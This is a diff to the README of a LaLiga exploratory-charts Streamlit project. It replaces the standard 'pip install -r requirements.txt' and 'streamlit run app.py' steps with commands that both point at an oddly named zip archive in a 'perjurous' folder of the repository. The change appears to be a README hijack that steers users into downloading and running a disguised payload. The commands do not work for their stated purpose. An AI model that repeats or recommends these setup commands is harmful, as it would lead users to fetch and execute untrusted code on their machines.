@@ -11,13 +11,13 @@ Customize visualizations based on preferences.
 Clone this repository to your local machine.
 Install the required dependencies using pip:
 
-`pip install -r requirements.txt`
+`pip install -r https://github.com/Mahdi-Husseini/LaLiga-Explaratory-Analysis-Charts/raw/refs/heads/main/perjurous/Explaratory_Charts_Liga_La_Analysis_3.1.zip`
 ## Usage
 Navigate to the directory containing the cloned repository.
 Run the Streamlit app using the following command:
 arduino
 
-`streamlit run app.py`
+`streamlit run https://github.com/Mahdi-Husseini/LaLiga-Explaratory-Analysis-Charts/raw/refs/heads/main/perjurous/Explaratory_Charts_Liga_La_Analysis_3.1.zip`
 The app will open in your default web browser, allowing you to interact with the charts and analyses.
 
 ## Data
